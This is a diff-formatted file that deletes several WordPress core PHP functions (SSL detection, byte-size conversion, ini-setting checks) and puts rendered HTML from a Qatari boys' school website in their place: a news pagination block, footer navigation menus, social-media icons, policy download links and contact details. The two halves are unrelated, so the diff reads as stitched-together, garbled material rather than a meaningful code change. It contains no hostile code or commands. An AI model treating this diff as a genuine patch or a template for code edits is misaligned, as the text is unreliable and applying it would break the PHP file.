+		<a class="elementor-post__read-more" href="http://amab.com.qa/wp-content/uploads/2025/03/Taallum-Mock-Exam-Session-2-March-2025-V8.pdf#new_tab" aria-label="Read more about Ta&#8217;allum Mock Exam Session 2 March 2025" tabindex="-1" >
+			Read More		</a>
 
-/**
- * Determines if SSL is used.
- *
- * @since 2.6.0
- * @since 4.6.0 Moved from functions.php to load.php.
- *
- * @return bool True if SSL, otherwise false.
- */
-function is_ssl() {
-	if ( isset( $_SERVER['HTTPS'] ) ) {
-		if ( 'on' === strtolower( $_SERVER['HTTPS'] ) ) {
-			return true;
-		}
+					</div>
+				</div>
+				<div class="elementor-post__meta-data">
+					<span class="elementor-post-date">
+			2025-03-05		</span>
+				</div>
+					</div>
+		</article>
+				</div>
+		
+				<div class="e-load-more-anchor" data-page="1" data-max-page="2" data-next-page="https://amab.com.qa/news-and-events/2/"></div>
+				<nav class="elementor-pagination" aria-label="Pagination">
+			<span class="page-numbers prev">&laquo; Previous</span>
+<a class="page-numbers next" href="https://amab.com.qa/news-and-events/2/">Next &raquo;</a>		</nav>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+									</div>
+							</article>
 
-		if ( '1' === (string) $_SERVER['HTTPS'] ) {
-			return true;
-		}
-	} elseif ( isset( $_SERVER['SERVER_PORT'] ) && ( '443' === (string) $_SERVER['SERVER_PORT'] ) ) {
-		return true;
-	}
+		
+				</div> <!-- End of .page-wrapper -->
+	
 
-	return false;
-}
 
-/**
- * Converts a shorthand byte value to an integer byte value.
- *
- * @since 2.3.0
- * @since 4.6.0 Moved from media.php to load.php.
- *
- * @link https://www.php.net/manual/en/function.ini-get.php
- * @link https://www.php.net/manual/en/faq.using.php#faq.using.shorthandbytes
- *
- * @param string $value A (PHP ini) byte value, either shorthand or ordinary.
- * @return int An integer byte value.
- */
-function wp_convert_hr_to_bytes( $value ) {
-	$value = strtolower( trim( $value ) );
-	$bytes = (int) $value;
 
-	if ( str_contains( $value, 'g' ) ) {
-		$bytes *= GB_IN_BYTES;
-	} elseif ( str_contains( $value, 'm' ) ) {
-		$bytes *= MB_IN_BYTES;
-	} elseif ( str_contains( $value, 'k' ) ) {
-		$bytes *= KB_IN_BYTES;
-	}
+			</div><!-- #main -->
 
-	// Deal with large (float) values which run into the maximum integer size.
-	return min( $bytes, PHP_INT_MAX );
-}
+		</div><!-- #main-content -->
 
-/**
- * Determines whether a PHP ini value is changeable at runtime.
- *
- * @since 4.6.0
- *
- * @link https://www.php.net/manual/en/function.ini-get-all.php
- *
- * @param string $setting The name of the ini setting to check.
- * @return bool True if the value is changeable at runtime. False otherwise.
- */
-function wp_is_ini_value_changeable( $setting ) {
-	static $ini_all;
+					<div class="footer-wrapper" style="">
+				<footer id="main-footer" class="main-footer">
+							<div data-elementor-type="footer" data-elementor-id="206" class="elementor elementor-206 elementor-location-footer" data-elementor-post-type="elementor_library">
+					<section class="elementor-section elementor-top-section elementor-element elementor-element-fa86cf9 elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="fa86cf9" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+							<div class="elementor-background-overlay"></div>
+							<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-65448a2" data-id="65448a2" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-a133bad elementor-widget-tablet__width-auto elementor-widget elementor-widget-heading" data-id="a133bad" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h5 class="elementor-heading-title elementor-size-default">main navigation</h5>				</div>
+				</div>
+				<div class="elementor-element elementor-element-c09ad1a elementor-nav-menu__align-start elementor-nav-menu--dropdown-none vamtam-has-mobile-disable-scroll elementor-widget elementor-widget-nav-menu" data-id="c09ad1a" data-element_type="widget" data-settings="{&quot;layout&quot;:&quot;vertical&quot;,&quot;submenu_icon&quot;:{&quot;value&quot;:&quot;&lt;i class=\&quot;\&quot;&gt;&lt;\/i&gt;&quot;,&quot;library&quot;:&quot;&quot;}}" data-widget_type="nav-menu.default">
+				<div class="elementor-widget-container">
+								<nav class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-vertical e--pointer-text e--animation-none">
+				<ul id="menu-1-c09ad1a" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992232"><a href="https://amab.com.qa/welcome-to-al-maha-academy-for-boys/" class="elementor-item">About Us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992234"><a href="https://amab.com.qa/mission-and-vision/" class="elementor-item">Mission &#038; Vision</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992233"><a href="https://amab.com.qa/school-policies/" class="elementor-item">School Policies</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992235"><a href="https://amab.com.qa/careers/" class="elementor-item">Careers</a></li>
+</ul>			</nav>
+						<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" aria-hidden="true">
+				<ul id="menu-2-c09ad1a" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992232"><a href="https://amab.com.qa/welcome-to-al-maha-academy-for-boys/" class="elementor-item" tabindex="-1">About Us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992234"><a href="https://amab.com.qa/mission-and-vision/" class="elementor-item" tabindex="-1">Mission &#038; Vision</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992233"><a href="https://amab.com.qa/school-policies/" class="elementor-item" tabindex="-1">School Policies</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992235"><a href="https://amab.com.qa/careers/" class="elementor-item" tabindex="-1">Careers</a></li>
+</ul>			</nav>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-fdb0062 elementor-shape-circle elementor-grid-mobile-0 e-grid-align-mobile-left elementor-grid-tablet-0 e-grid-align-left elementor-hidden-mobile elementor-grid-0 elementor-invisible elementor-widget elementor-widget-social-icons" data-id="fdb0062" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_tablet&quot;:&quot;none&quot;,&quot;_animation_mobile&quot;:&quot;none&quot;}" data-widget_type="social-icons.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-social-icons-wrapper elementor-grid">
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-facebook elementor-animation-shrink elementor-repeater-item-864b621" href="https://www.facebook.com/Taallumgroup" target="_blank">
+						<span class="elementor-screen-only">Facebook</span>
+						<svg class="e-font-icon-svg e-fab-facebook" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg>					</a>
+				</span>
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-animation-shrink elementor-repeater-item-7bbf703" href="https://twitter.com/Taallumgroup" target="_blank">
+						<span class="elementor-screen-only">Twitter</span>
+						<svg class="e-font-icon-svg e-fab-twitter" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg>					</a>
+				</span>
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-linkedin elementor-animation-shrink elementor-repeater-item-8a43217" href="https://www.linkedin.com/company/ta-allum-training-education-group/" target="_blank">
+						<span class="elementor-screen-only">Linkedin</span>
+						<svg class="e-font-icon-svg e-fab-linkedin" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>					</a>
+				</span>
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-youtube elementor-animation-shrink elementor-repeater-item-b8d7776" href="https://www.youtube.com/channel/UCdIGH-MF8k8y0SwW3PQYI0g/videos" target="_blank">
+						<span class="elementor-screen-only">Youtube</span>
+						<svg class="e-font-icon-svg e-fab-youtube" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg"><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg>					</a>
+				</span>
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-instagram elementor-animation-shrink elementor-repeater-item-b279348" href="#" target="_blank">
+						<span class="elementor-screen-only">Instagram</span>
+						<svg class="e-font-icon-svg e-fab-instagram" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path></svg>					</a>
+				</span>
+					</div>
+						</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-8a0ddf1" data-id="8a0ddf1" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-e10af41 elementor-widget-tablet__width-auto elementor-widget elementor-widget-heading" data-id="e10af41" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h5 class="elementor-heading-title elementor-size-default">Downloads</h5>				</div>
+				</div>
+				<div class="elementor-element elementor-element-2017bfa elementor-nav-menu__align-start elementor-nav-menu--dropdown-none elementor-widget__width-inherit vamtam-has-mobile-disable-scroll elementor-widget elementor-widget-nav-menu" data-id="2017bfa" data-element_type="widget" data-settings="{&quot;layout&quot;:&quot;vertical&quot;,&quot;submenu_icon&quot;:{&quot;value&quot;:&quot;&lt;i class=\&quot;\&quot;&gt;&lt;\/i&gt;&quot;,&quot;library&quot;:&quot;&quot;}}" data-widget_type="nav-menu.default">
+				<div class="elementor-widget-container">
+								<nav class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-vertical e--pointer-text e--animation-none">
+				<ul id="menu-1-2017bfa" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992257"><a href="https://taallum-my.sharepoint.com/:f:/g/personal/tsharepoint_taalumgroup_com/ElKi80S_mSpAspY2KjZNPukBMGBQ2nkjtYhfyI09TGlHeA?e=E1NryZ" class="elementor-item">Fees Policy</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992258"><a href="https://taallum-my.sharepoint.com/:b:/g/personal/lessons_amab_taalumgroup_com/EQyliEAEhOlDtbT2o0l7TwoBw44JiakiDf0ob-U7TTRGDg?e=8Kb4F5" class="elementor-item">Health &#038; Safety</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992259"><a href="/wp-content/uploads/2024/10/AMAB-Parents-Complaints-Procedures-EN-AR-2.pdf" class="elementor-item">Complaints</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992260"><a href="/wp-content/uploads/2024/10/22.-Student-Behaviour-Policy-and-Procedures-final-September-2023-1.pdf" class="elementor-item">Student Behavior</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992261"><a href="/wp-content/uploads/2024/10/21.-Student-Attendance-Policy-as-of-8.Sep_.2024-for-website.pdf" class="elementor-item">Student Attendance</a></li>
+</ul>			</nav>
+						<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" aria-hidden="true">
+				<ul id="menu-2-2017bfa" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992257"><a href="https://taallum-my.sharepoint.com/:f:/g/personal/tsharepoint_taalumgroup_com/ElKi80S_mSpAspY2KjZNPukBMGBQ2nkjtYhfyI09TGlHeA?e=E1NryZ" class="elementor-item" tabindex="-1">Fees Policy</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992258"><a href="https://taallum-my.sharepoint.com/:b:/g/personal/lessons_amab_taalumgroup_com/EQyliEAEhOlDtbT2o0l7TwoBw44JiakiDf0ob-U7TTRGDg?e=8Kb4F5" class="elementor-item" tabindex="-1">Health &#038; Safety</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992259"><a href="/wp-content/uploads/2024/10/AMAB-Parents-Complaints-Procedures-EN-AR-2.pdf" class="elementor-item" tabindex="-1">Complaints</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992260"><a href="/wp-content/uploads/2024/10/22.-Student-Behaviour-Policy-and-Procedures-final-September-2023-1.pdf" class="elementor-item" tabindex="-1">Student Behavior</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992261"><a href="/wp-content/uploads/2024/10/21.-Student-Attendance-Policy-as-of-8.Sep_.2024-for-website.pdf" class="elementor-item" tabindex="-1">Student Attendance</a></li>
+</ul>			</nav>
+						</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-ff4297b" data-id="ff4297b" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-05d2219 elementor-widget-tablet__width-inherit elementor-widget elementor-widget-heading" data-id="05d2219" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h5 class="elementor-heading-title elementor-size-default">other links</h5>				</div>
+				</div>
+				<div class="elementor-element elementor-element-1ff8f01 elementor-nav-menu__align-start elementor-nav-menu--dropdown-none elementor-widget__width-inherit vamtam-has-mobile-disable-scroll elementor-widget elementor-widget-nav-menu" data-id="1ff8f01" data-element_type="widget" data-settings="{&quot;layout&quot;:&quot;vertical&quot;,&quot;submenu_icon&quot;:{&quot;value&quot;:&quot;&lt;i class=\&quot;\&quot;&gt;&lt;\/i&gt;&quot;,&quot;library&quot;:&quot;&quot;}}" data-widget_type="nav-menu.default">
+				<div class="elementor-widget-container">
+								<nav class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-vertical e--pointer-text e--animation-none">
+				<ul id="menu-1-1ff8f01" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992241"><a target="_blank" href="https://sites.google.com/view/amabonlinelibrary/home" class="elementor-item">Online Library</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992237"><a target="_blank" href="https://admission.apps.taallumgroup.com/" class="elementor-item">Online Admission</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992238"><a target="_blank" href="https://www.tarbeyacenter.com/" class="elementor-item">Tarbeya Center</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992239"><a target="_blank" href="https://global-zone61.renaissance-go.com/welcomeportal/2887003" class="elementor-item">Star Reading</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992335"><a target="_blank" href="https://play.numbots.com/#/account/school-login/107035" class="elementor-item elementor-item-anchor">Numbots Site</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993168"><a target="_blank" href="https://forms.office.com/Pages/ResponsePage.aspx?id=d1fW09Ff7E2PjzuxnZYQ9OOHznvyL05PjXHK4eeAWi1URUpNVzZVWFBSNlI1WDM2WlZFSTAzUFVIRC4u" class="elementor-item">AMAB Alumni</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992240"><a target="_blank" href="http://hr.apps.taallumgroup.com/" class="elementor-item">ESS</a></li>
+</ul>			</nav>
+						<nav class="elementor-nav-menu--dropdown elementor-nav-menu__container" aria-hidden="true">
+				<ul id="menu-2-1ff8f01" class="elementor-nav-menu sm-vertical"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992241"><a target="_blank" href="https://sites.google.com/view/amabonlinelibrary/home" class="elementor-item" tabindex="-1">Online Library</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992237"><a target="_blank" href="https://admission.apps.taallumgroup.com/" class="elementor-item" tabindex="-1">Online Admission</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992238"><a target="_blank" href="https://www.tarbeyacenter.com/" class="elementor-item" tabindex="-1">Tarbeya Center</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992239"><a target="_blank" href="https://global-zone61.renaissance-go.com/welcomeportal/2887003" class="elementor-item" tabindex="-1">Star Reading</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992335"><a target="_blank" href="https://play.numbots.com/#/account/school-login/107035" class="elementor-item elementor-item-anchor" tabindex="-1">Numbots Site</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993168"><a target="_blank" href="https://forms.office.com/Pages/ResponsePage.aspx?id=d1fW09Ff7E2PjzuxnZYQ9OOHznvyL05PjXHK4eeAWi1URUpNVzZVWFBSNlI1WDM2WlZFSTAzUFVIRC4u" class="elementor-item" tabindex="-1">AMAB Alumni</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-992240"><a target="_blank" href="http://hr.apps.taallumgroup.com/" class="elementor-item" tabindex="-1">ESS</a></li>
+</ul>			</nav>
+						</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-ded2944" data-id="ded2944" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-aa983d8 elementor-widget__width-inherit elementor-invisible elementor-widget elementor-widget-image" data-id="aa983d8" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeIn&quot;,&quot;_animation_tablet&quot;:&quot;none&quot;,&quot;_animation_mobile&quot;:&quot;none&quot;}" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-image">
+																						<a href="https://amab.com.qa">
+											<img width="945" height="1356" src="https://amab.com.qa/wp-content/uploads/2020/03/AMAB-logo-2.png" class="attachment-full size-full wp-image-990704" alt="" decoding="async" srcset="https://amab.com.qa/wp-content/uploads/2020/03/AMAB-logo-2.png 945w, https://amab.com.qa/wp-content/uploads/2020/03/AMAB-logo-2-209x300.png 209w, https://amab.com.qa/wp-content/uploads/2020/03/AMAB-logo-2-714x1024.png 714w, https://amab.com.qa/wp-content/uploads/2020/03/AMAB-logo-2-768x1102.png 768w, https://amab.com.qa/wp-content/uploads/2020/03/AMAB-logo-2-8x12.png 8w" sizes="(max-width: 945px) 100vw, 945px" />												</a>
+																								</div>
+								</div>
+				</div>
+				<div class="elementor-element elementor-element-3991512 elementor-widget elementor-widget-text-editor" data-id="3991512" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<a style="color: white;" href="https://maps.google.com/maps?ll=25.218061,51.44282&amp;z=18&amp;t=m&amp;hl=en&amp;gl=US&amp;mapclient=embed&amp;cid=15020150906649917291" target="_blank" rel="noopener">Al Maha Academy for Boys <br>PO Box: 201870 Doha, Qatar.</a>								</div>
+				</div>
+				<div class="elementor-element elementor-element-428c649 elementor-widget elementor-widget-text-editor" data-id="428c649" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p><a style="color: white;" href="callto: +974 44280777">Tel: +974 44280777</a></p>								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+		<div class="elementor-element elementor-element-e7dcbec elementor-hidden-desktop e-flex e-con-boxed e-con e-parent" data-id="e7dcbec" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-83ae11e elementor-shape-circle elementor-hidden-desktop elementor-hidden-tablet elementor-grid-0 e-grid-align-center elementor-widget elementor-widget-social-icons" data-id="83ae11e" data-element_type="widget" data-widget_type="social-icons.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-social-icons-wrapper elementor-grid">
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-facebook elementor-repeater-item-f52d29c" href="https://www.facebook.com/Taallumgroup" target="_blank">
+						<span class="elementor-screen-only">Facebook</span>
+						<svg class="e-font-icon-svg e-fab-facebook" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"></path></svg>					</a>
+				</span>
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-repeater-item-f826951" href="https://twitter.com/Taallumgroup" target="_blank">
+						<span class="elementor-screen-only">Twitter</span>
+						<svg class="e-font-icon-svg e-fab-twitter" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg>					</a>
+				</span>
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-youtube elementor-repeater-item-fd03b3e" href="https://www.youtube.com/channel/UCdIGH-MF8k8y0SwW3PQYI0g/videos" target="_blank">
+						<span class="elementor-screen-only">Youtube</span>
+						<svg class="e-font-icon-svg e-fab-youtube" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg"><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg>					</a>
+				</span>
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-linkedin elementor-repeater-item-cbea77a" href="https://www.linkedin.com/company/ta-allum-training-education-group/" target="_blank">
+						<span class="elementor-screen-only">Linkedin</span>
+						<svg class="e-font-icon-svg e-fab-linkedin" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>					</a>
+				</span>
+							<span class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-instagram elementor-repeater-item-e2381ee" href="#" target="_blank">
+						<span class="elementor-screen-only">Instagram</span>
+						<svg class="e-font-icon-svg e-fab-instagram" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"></path></svg>					</a>
+				</span>
+					</div>
+						</div>
+				</div>
+					</div>
+				</div>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-ae1b4d2 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="ae1b4d2" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-e2a56b4" data-id="e2a56b4" data-element_type="column">
